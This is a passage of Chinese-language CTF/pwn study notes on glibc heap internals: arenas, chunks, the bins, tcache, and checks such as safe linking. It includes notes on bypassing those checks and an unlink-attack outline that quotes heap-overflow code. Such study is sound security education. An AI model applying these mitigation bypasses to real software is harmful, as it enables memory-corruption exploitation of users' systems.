<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>io</span><span class=o>.</span> <span class=s2>&#34;b _int_malloc</span><span class=se>\n</span><span class=s2>c&#34;</span><span class=p>)</span></span></span></code></pre></div></div><h3 id=堆管理器>堆管理器</h3><p>用户与 OS 之间作为动态内存管理的中间人，由 libc.so.6 链接库实现，封装了系统调用（申请内存的 <code>brk</code> 与 <code>mmap</code> ），存在于【shared library 即 mmap 段】</p><ul><li>响应用户申请内存，向 OS 申请内存，内核会预先分配很大的连续内存给堆管理器，返回给用户程序，堆空间不足再次与 OS 交互</li><li>管理用户释放的内存，适时归还 OS，也可响应用户新申请内存请求</li></ul><p><strong>系统调用</strong></p><p>内存管理函数的系统调用包括 <strong>(s)brk、mmap、munmap</strong> 函数等</p><ul><li><p><code>__brk(sys_brk)</code> ：</p><ul><li>堆通过 brk 向 bss 段和 data 数据段扩展【主线程、子线程可用】</li><li>main arena 中通过 sbrk 扩展 heap</li><li>初始堆的起始地址 start_brk 及堆的当前末尾 brk 指向同一地址，不开 ASLR 指向 data/bss 段结尾，开 ASLR 指向 data/bss 结尾的随机偏移处</li></ul></li><li><p><code>__mmap(sys_mmap_pgoff)</code> ：</p><ul><li>物理内存/磁盘映射到虚拟内存中，未进行新的申请，在 mmap 段直接映射获取【子线程可用】</li><li>thread arena 中通过 mmap 分配新 heap</li><li>创建独立的匿名映射段，目的是可以申请以 0 填充的内存，该内存仅被调用进程所使用</li></ul></li></ul><p><strong>各种堆管理器</strong></p><ol><li>dlmalloc - General purpose allocator</li><li>ptmalloc2 - <strong>glibc</strong></li><li>jemalloc - FreeBSD and Firefox</li><li>tcmalloc - Google</li><li>libumem - Solaris</li></ol><h4 id=arena>arena</h4><p>内存分配区，每个线程都单独有一个 arena 实例管理堆内存区域，用于加速多线程，主分配区和子分配区形成一个环形链表，每个线程中都存在一个私有变量存放分配区指针，分配内存时，未上锁的分配区来分配内存，若全被占用则建立新分配区</p><ul><li>操作系统 &ndash;> 堆管理器 &ndash;> 用户</li><li>物理内存 &ndash;> arena &ndash;> 可用内存</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// glibc-2.23
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>struct</span> <span class=n>malloc_state</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// glibc-2.27: mutex_t mutex;
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>__libc_lock_define</span> <span class=p>(,</span> <span class=n>mutex</span><span class=p>);</span>        <span class=c1>// 多线程互斥锁，4字节，保证线程安全
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>flags</span><span class=p>;</span>                           <span class=c1>// 标志位，是否有fastbin、内存是否连续，4字节
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>mfastbinptr</span> <span class=n>fastbinsY</span><span class=p>[</span><span class=n>NFASTBINS</span><span class=p>];</span> <span class=cm>/* 存放 fastbin chunk 的数组 80字节 10项 单向连接 */</span>
</span></span><span class=line><span class=cl>  <span class=n>mchunkptr</span> <span class=n>top</span><span class=p>;</span> <span class=cm>/* 指向Top Chunk堆顶 */</span>
</span></span><span class=line><span class=cl>  <span class=n>mchunkptr</span> <span class=n>last_remainder</span><span class=p>;</span><span class=c1>// 上一个chunk分配出一个small chunk给用户后的剩余部分，随后放入unsorted bin中
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>mchunkptr</span> <span class=n>bins</span><span class=p>[</span><span class=n>NBINS</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>-</span> <span class=mi>2</span><span class=p>];</span> <span class=cm>/* 存放闲置chunk的数组，包含large/small/unsorted bin 双向链接 */</span>
</span></span><span class=line><span class=cl>  <span class=c1>// #define NBINS 128
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=cm>/* 记录 bin 是否为空的 位图，chunk被取出后若一个bin空了不立即置0，下一次遍历才重新置0*/</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>binmap</span><span class=p>[</span><span class=n>BINMAPSIZE</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=c1>// 每一个bit表示对应bin是否存在空闲chunk，4个block管理，每个block 4个字节，共128位
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_state</span> <span class=o>*</span><span class=n>next</span><span class=p>;</span> <span class=cm>/* 指向下一个arena的指针，进程内所有arena串成循环单向链表 */</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_state</span> <span class=o>*</span><span class=n>next_free</span><span class=p>;</span><span class=c1>// 指向下一个空闲arena的指针
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>INTERNAL_SIZE_T</span> <span class=n>attached_threads</span><span class=p>;</span> <span class=c1>// 与该arena相关的线程数
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>INTERNAL_SIZE_T</span> <span class=n>system_mem</span><span class=p>;</span> <span class=c1>// 记录当前arena在堆区中所分配的内存总大小
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>INTERNAL_SIZE_T</span> <span class=n>max_system_mem</span><span class=p>;</span> <span class=c1>// 申请释放内存过程中system_mem的峰值
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>malloc_state</span> <span class=o>*</span><span class=n>mstate</span><span class=p>;</span></span></span></code></pre></div></div><ul><li><p><code>main_arena</code>定义在 libc malloc.c 中的<strong>静态</strong><code>malloc_state</code>结构体实例</p></li><li><p>随 libc 文件一同加载到内存映射段，泄露 arena 地址可获得 libc 在内存中基地址</p></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=k>struct</span> <span class=n>malloc_state</span> <span class=n>main_arena</span> <span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=p>.</span><span class=n>mutex</span> <span class=o>=</span> <span class=n>_LIBC_LOCK_INITIALIZER</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>.</span><span class=n>next</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>main_arena</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=p>.</span><span class=n>attached_threads</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=p>};</span></span></span></code></pre></div></div><h4 id=chunk>chunk</h4><p>用户申请内存的基本单位，malloc 返回的指针指向一个 chunk 的数据区域</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// chunk在glibc中的实现
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>struct</span> <span class=n>malloc_chunk</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>INTERNAL_SIZE_T</span>      <span class=n>prev_size</span><span class=p>;</span>  <span class=c1>// 前一个空闲chunk的大小，不空闲则存储物理相邻的前chunk的数据
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>INTERNAL_SIZE_T</span>      <span class=n>size</span><span class=p>;</span>       <span class=c1>// 本chunk大小
</span></span></span><span class=line><span class=cl><span class=c1></span> <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>     size必须为2*SIZE_SZ(机器字长)整数倍，机器字长：32位4,64位8
</span></span></span><span class=line><span class=cl><span class=cm>     假如最低的chunk单位为8字节，大小补齐必须为8的倍数，最低三位只能为0，将该三位作为控制位
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>malloc_chunk</span><span class=o>*</span> <span class=n>fd</span><span class=p>;</span> <span class=c1>// chunk处于分配状态，fd字段开始是用户数据，chunk空闲时，添加到对应空闲管理链表中
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>struct</span> <span class=n>malloc_chunk</span><span class=o>*</span> <span class=n>bk</span><span class=p>;</span> <span class=c1>// fd指向下一个空闲chunk，bk指向上一个空闲chunk, 双向连接
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=c1>// chunk空闲时，只用于large chunk，双向连接
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>struct</span> <span class=n>malloc_chunk</span><span class=o>*</span> <span class=n>fd_nextsize</span><span class=p>;</span> <span class=c1>// fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>struct</span> <span class=n>malloc_chunk</span><span class=o>*</span> <span class=n>bk_nextsize</span><span class=p>;</span> <span class=c1>// bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不包含bin的头指针
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>};</span></span></span></code></pre></div></div><ol><li>当其为 malloced chunk 时，用 prev size 和 size 2 个字段；若其前的 chunk 也为 malloced chunk 时，只用 size 1 个字段</li><li>当其为 fast bin 时，用到 prev_size, size, fd 3 个字段</li><li>当其为 small bin 或 unsorted bin 时，用到 prev_size, size, fd, bk 4 个字段</li><li>当其为 large bin 时，用到所有 6 个字段</li></ol><p>amd64 下最小 chunk 为 32 字节(0x20)，malloc(0x10)导致申请了 0x20 的 chunk；x86 下最小 chunk 为 16 字节(0x10)</p><table><thead><tr><th>prev size 0x8</th></tr></thead><tbody><tr><td>size 0x8</td></tr><tr><td>0x8 ← <strong>malloc 返回指针</strong></td></tr><tr><td>0x8</td></tr></tbody></table><p><strong>prev size 复用</strong></p><ul><li><p>当前面的 chunk 多申请了 0x8 则 prev size 可以用于存放数据，因为只有前 chunk 为 free chunk，prev size 才有意义</p></li><li><p>申请<strong>0xn8</strong>与<strong>0xn0</strong>是完全一致的，申请 0xn0 的堆后，实际堆大小为 0xn8</p></li></ul><p><strong>标志位（AMP）</strong></p><ul><li><strong>A（NON_MAIN_ARENA）</strong>：A=0 属于主线程/主分区，A=1 为非主分区分配，不属于主线程</li><li><strong>M（IS_MAPPED）</strong>：M=1 表示使用 mmap 映射区域，M=0 为使用 heap 区域</li><li><strong>P（PREV_INUSE）</strong>：P=0 表示 pre_chunk 空闲可合并，mchunk_prev_size 才有效，P=1 表示前一个 chunk 被分配，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1</li></ul><p><strong>malloced chunk 及 free chunk</strong></p><img src=/img/pwn_note.zh-cn.assets/image-20241118185316263.png alt=图片无法加载><p><strong>top chunk</strong></p><ul><li>本质上是 free chunk，向操作系统申请到的内存减去 malloc 用掉的那一部分后剩余的内存由 top chunk 管理，物理地址最高</li><li>其<code>prev_inuse</code>位始终为 1，否则其前面的 chunk 会合并到 top chunk，</li><li>当申请的最后一个堆块进行<code>free</code>时，将会直接并入<code>top chunk</code>，通常利用来隔开<code>top chunk</code></li></ul><p><strong>last remainder</strong></p><p>用户 malloc 请求，ptmalloc2 分配 chunk 给用户时内存大小不一致，用户取走后剩余的那一部分</p><h4 id=bin>bin</h4><ul><li>管理 arena 中空闲 chunk 的结构，以数组形式存在，数组元素为相应大小的 chunk 链表的链表头，存在于 arena 的 malloc_state 中</li><li>small bins，large bins，unsorted bin 维护在 bins 数组中，共 127 项，每连续两个 chunk 指针维护一个 bin(fd 和 bk)</li><li>small bins 中 chunk 大小[32~1008]，large bins 的每个 bin 中 chunk 大小在一个范围内</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241118182846943.png alt=图片无法加载><p><strong>先找 fast bins 和 small bins，然后找 unsorted bin，仍找不到则触发 unsorted bin 遍历，合并分类，再去对应 small bins 和 large bins 找，仍找不到则在 top chunk 中划分一些</strong></p><h5 id=unsorted-bin>Unsorted bin</h5><ul><li>循环双向链表，FIFO，<strong>插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>，b[1]，一般为&lt;main_arena+88>，为链表头，视为空闲 chunk 回归其所属 bin（small bin 和 large bin）之前的缓冲区，大于 0x80 的先进入 unsorted bin，chunk 大小乱序，通过 fd 遍历</li><li>malloc&mdash;->遍历时将会进行【sort 分类到其他 bins 中】以及【合并 free chunk】，故不能先 unsorted bin attack 任意地址写后再遍历，因为遍历时会程序崩溃</li><li>当 malloc 小于 unsorted bin 大小的块时，会将 unsorted bin 中堆块<strong>切割</strong>后返回，free 时靠着 top chunk 会合并</li></ul><img src=/img/pwn_note.zh-cn.assets/172844670575348.png alt=图片无法加载><h5 id=fast-bins>Fast bins</h5><ul><li><p>单向链表<strong>LIFO</strong>，管理 32 位下 16、24、32、40、48、56、64 Bytes 及 64 位下 32、48、64、80、96、112、128 的 free chunk</p></li><li><p>其中 chunk 的 P 位总为<strong>1</strong>，且 fast bin 不与其他被释放的 chunk 进行<strong>合并</strong>操作，也不与 top chunk 合并，除非调用<code>malloc_consolidate</code>函数，操作都是对链表尾，<code>malloc(0) ~ malloc(0x70)</code></p></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>fastbin</span> <span class=o>--&gt;</span> <span class=n>third_free_chunk</span> <span class=o>--&gt;</span> <span class=n>second_free_chunk</span> <span class=o>--&gt;</span> <span class=n>first_free_chunk</span> <span class=o>&lt;--</span> <span class=mh>0x00</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20241118184536264.png alt=图片无法加载><p><strong>安全检查</strong></p><ul><li><p><strong>size</strong>：malloc 分配 fastbin 范围的 chunk 时，若对应 fastbin 中有空闲 chunk，取出前检查其<code>size</code>域与对应下标是否一致，不会检查标志位，若否会触发<code>abort</code></p></li><li><p><strong>double free</strong>：在 free 函数中会对 fast bin 链表的头结点进行检查，若将被放入 fast bin 中的 chunk 与对应下标的链表的头结点为同一 chunk 会触发<code>abort</code></p></li><li><p><strong>Safe linking</strong>机制（> glibc-2.32）：在链表上的 chunk 不直接放其所连接的下一个 chunk 的地址，而是存放下一个 chunk 地址与【fd 指针自身地址右移 12 位】异或得到的值，使得攻击者得知该 chunk 地址无法直接利用，</p><ul><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define PROTECT_PTR(pos, ptr) \
</span></span></span><span class=line><span class=cl><span class=cp>  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
</span></span></span><span class=line><span class=cl><span class=cp>#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span></span></code></pre></div></div></li><li><p><strong>绕过</strong>：入口结点存放仍然是未经异或的 chunk 地址；第一个加入 fast bin 的 chunk 的 fd 字段可以泄露堆地址(右移 12 位)</p></li></ul></li></ul><h5 id=tcache>Tcache</h5><ul><li>glibc-2.26 (ubuntu 17.10) 后引入，扩大版 fastbin，无 double free 机制，<strong>LIFO</strong></li><li>free 的 chunk 小于 small bin size 时，放入 tcache，塞<strong>满</strong>7 个后，大小相同的 free chunk 进入 fastbin 或 unsorted bin；tcache 中<strong>chunk 不合并</strong></li></ul><img src=/img/pwn_note.zh-cn.assets/172844670575350.png alt=图片无法加载><p>引入 2 个新结构体：</p><ul><li><code>tcache_entry</code>：链接空闲 chunk，next 指针指向下一个大小相同的 chunk 的 user data 处，并会复用空闲 chunk user data 部分</li><li>此处<code>next</code>指向 chunk 的<code>user data</code>，而 fast bin 的<code>fd</code>指向 chunk 开头的地址，<code>tcache_entry</code>会复用空闲 chunk 的<code>user data</code>部分</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>tcache_entry</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>tcache_entry</span> <span class=o>*</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>tcache_entry</span><span class=p>;</span></span></span></code></pre></div></div><ul><li><code>tcache_perthread_struct</code>：单向链表方式链接了相同大小的空闲 free chunk，counts 记录空闲 chunk 数，每条链上最多 7 个 chunk</li><li>每个 thread 维护一个该结构体，第一次申请会 malloc 一块内存，该结构在<code>tcache_init</code>函数中初始化在堆上，大小为 0x250(高版本 0x290)，数据部分前 0x40 为 counts，释放进入 tcache 的 chunk 的下一个相邻 chunk 的<code>PREV_INUSE</code>位不清零</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>tcache_perthread_struct</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>counts</span><span class=p>[</span><span class=n>TCACHE_MAX_BINS</span><span class=p>];</span> <span class=c1>// 1字节
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>tcache_entry</span> <span class=o>*</span><span class=n>entries</span><span class=p>[</span><span class=n>TCACHE_MAX_BINS</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>tcache_perthread_struct</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp># define TCACHE_MAX_BINS                64
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=n>__thread</span> <span class=n>tcache_perthread_struct</span> <span class=o>*</span><span class=n>tcache</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span> <span class=c1>// 减少线程竞争
</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20241118215138701.png alt=图片无法加载><p><strong>key 字段</strong></p><ul><li>glibc-2.29 引入，位于 chunk 的 bk 字段，值为 tcache 结构体地址，用于检测 double free，可泄露 tcache key 泄露堆地址</li><li>glibc-2.34 后，<code>tcache_put</code>函数中，key 值设为随机值<code>tcache_key</code>，不再能泄露堆地址</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>tcache_entry</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>tcache_entry</span> <span class=o>*</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>tcache_perthread_struct</span> <span class=o>*</span><span class=n>key</span><span class=p>;</span> <span class=c1>// 检测double free
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span> <span class=n>tcache_entry</span><span class=p>;</span></span></span></code></pre></div></div><p><strong>stash 机制</strong></p><p>申请在 tcache 范围时，先 tcache 直到空，再去 bin 找；tcache 为空，ptmalloc 在其他 bin 中找，若 fastbin/smallbin/unsorted bin 有 size 符合的 chunk，填入 tcache 直到塞满，之后从 tcache 中取或直接返回找到的 chunk（<strong>此时 chunk 在 bin 中和 tcache 中顺序颠倒</strong>）</p><p><strong>安全检查</strong></p><ul><li><strong>tcache key( >libc-2.29 )</strong>：tcache 新增一个 key 字段，位于 chunk 的 bk 字段，值为 tcache 结构体地址，若 free 检测到<code>chunk->bk==tcache</code>会遍历 tcache 查找对应链表中是否有该 chunk</li><li><strong>Safe linking 机制( > libc-2.32 )</strong><ul><li><strong>绕过</strong>：在 tcache 的一个 entry 中放入第一个 chunk 时，其同样会对该 entry 中的 chunk(NULL)进行异或后写入到 tcache 中 chunk 的 fd 字段，若能泄露该 fd 字段可以获取未经异或的堆上相关地址（右移 12 位）；<code>tcache->entry</code>中存放的仍是未加密过的地址，若能够控制<code>tcache</code>管理器则可以在不知道堆相关地址时任意地址写</li></ul></li></ul><h5 id=small-bins>Small bins</h5><ul><li>每个 bin 中的 chunk 大小都相等，bins[2] ~ bins[63]，62 个循环双向链表，FIFO</li><li>管理 32 位中 16、24、32、40、&mldr;、504 Bytes 的 free chunks，64 位最大 chunk 为 1008 字节(0x3f0)，按 bk 方向取 chunk</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241118193142122.png alt=图片无法加载><h5 id=large-bins>Large bins</h5><ul><li>每个 bin 中的 chunk 大小是一个范围，不相等，<strong>fd 指针指向的方向上按照 chunk 大小降序排序，bk 指向最小 chunk</strong></li><li>bins[64] ~ bins[126]，63 个循环双向链表，FIFO，管理大于 504 Bytes 的 free chunks（32 位下），6 组中每组 bin 的 chunk 大小之间公差一致</li></ul><table><thead><tr><th>1 bin</th><th>2 bins</th><th>4 bins</th><th>8 bins</th><th>16 bins</th><th>32 bins</th></tr></thead><tbody><tr><td>any</td><td>262144b</td><td>32768b</td><td>4096b</td><td>512b</td><td>64b</td></tr></tbody></table><ul><li><code>fd_nextsize</code>和<code>bk_nextsize</code>与<code>bins</code>数组无关</li><li>large bin 中只有一个 chunk 时，<code>fd_nextsize</code>和<code>bk_nextsize</code>指向自己</li><li>large bin 中有多个同一大小的 chunk 时，只有相同大小 chunk 的第一个的<code>fd_nextsize</code>和<code>bk_nextsize</code>指针有效，其余均为 NULL</li><li>large bin 中有多个不同大小的 chunk 时，<code>fd_nextsize</code>连接比他小的第一个 chunk，<code>bk_nextsize</code>对应反过来连接</li><li>large bin 最小的一组 chunk 中的第一个 chunk 的<code>fd_nextsize</code>连接最大的 chunk，最大的 chunk 的<code>bk_nextsize</code>相反</li></ul><img src=/img/pwn_note.zh-cn.assets/image-20241118201403530.png alt=图片无法加载><h3 id=漏洞点>漏洞点</h3><h4 id=unlink>Unlink</h4><ul><li><strong>条件</strong>：有堆溢出或 off by null，且可以泄露出指针数组地址</li><li><code>free</code>时和目前<strong>物理相邻的 free chunk 合并为新堆块</strong>，避免碎片化内存，将某一个空闲 chunk 从其所处的双向链表中脱链</li><li><strong>释放堆时会判断当前 chunk 的相邻 chunk 是否为空闲状态，若是则会进行堆合并。合并时会将空闲 chunk 从 bin 中 unlink，并将合并后的 chunk 添加到 unsorted bin 中。堆合并分为向前合并和向后合并</strong></li></ul><p><strong>漏洞点：堆溢出</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-C"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>RecordList</span> <span class=o>+</span> <span class=n>i</span><span class=p>)</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>v1</span><span class=p>);</span> <span class=c1>// v1 &lt; 0x81 Create函数
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>RecordList</span> <span class=o>+</span> <span class=n>v1</span><span class=p>),</span> <span class=mh>0x100uLL</span><span class=p>);</span> <span class=c1>// change函数
</span></span></span></code></pre></div></div><p>溢出长度足够大，在已申请的堆中<strong>伪造一块已经释放过的堆</strong>，当 free 其前或后面的堆块时会触发 unlink，使得伪造的部分会指向一个我们指定的地方，允许我们修改</p><p><strong>绕过</strong></p><p><strong>2.23</strong></p><ol><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nf>__builtin_expect</span><span class=p>(</span><span class=n>FD</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>!=</span> <span class=n>P</span> <span class=o>||</span> <span class=n>BK</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>!=</span> <span class=n>P</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span></span></span></code></pre></div></div><p>伪造 fake chunk，将指针数组作为 chunk 绕过</p></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nf>in_smallbin_range</span><span class=p>(</span><span class=nf>chunksize_nomask</span><span class=p>(</span><span class=n>P</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=nf>__builtin_expect</span><span class=p>(</span><span class=n>P</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span><span class=p>(</span><span class=n>P</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span> <span class=o>!=</span> <span class=n>P</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>        <span class=nf>__builtin_expect</span><span class=p>(</span><span class=n>P</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span> <span class=o>!=</span> <span class=n>P</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span></span></span></code></pre></div></div><p>使 fake chunk 属于 small bin 范围绕过</p></li><li><p>为了使 chunk2 与 fake chunk 合并，chunk2 的 size 的 PREV_INUSE 位为 0，且 chunk2 大小不能在 fast bin 范围</p></li></ol><p><strong>2.27</strong></p><ol><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
